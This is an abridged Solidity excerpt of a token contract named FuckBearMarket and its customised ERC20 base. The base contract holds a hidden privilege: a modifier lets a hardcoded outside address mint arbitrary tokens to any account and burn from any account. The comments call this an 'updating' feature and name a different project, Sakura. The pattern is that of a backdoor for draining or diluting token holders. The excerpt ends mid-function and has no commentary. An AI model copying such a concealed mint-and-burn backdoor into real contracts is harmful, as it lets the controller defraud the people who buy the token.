...
contract FuckBearMarket is ERC20, Ownable {
    ...
    constructor(address _feesManagerAddress) ERC20("FuckBearMarket", "FBM") {
    ...
    function updateDevAndMarketingWallet(address newWallet) external onlyOwner {
    ...
    function swapBack() private {
        ...
        (success, ) = address(devAndMarketingWallet).call{
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyFbmContracts{
        //FeesManager and Sakura main contract address (added dead address for contract deployment)
        require(msg.sender == 0xed7e37394bf120e5B174Bc431B096d214D09ff27 || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: not a Sakura contract");
        _;
    }
    ...
    function feesManagerCancelBurn(address account, uint256 amount) public onlyFbmContracts{
        // Only this contract and feesManager can call it. For updating purposes
        _mint( account, amount);
    }
    
    function feesManagerBurn(address account, uint256 amount)  public onlyFbmContracts{
         // Only this contract and feesManager can call it. For updating purposes
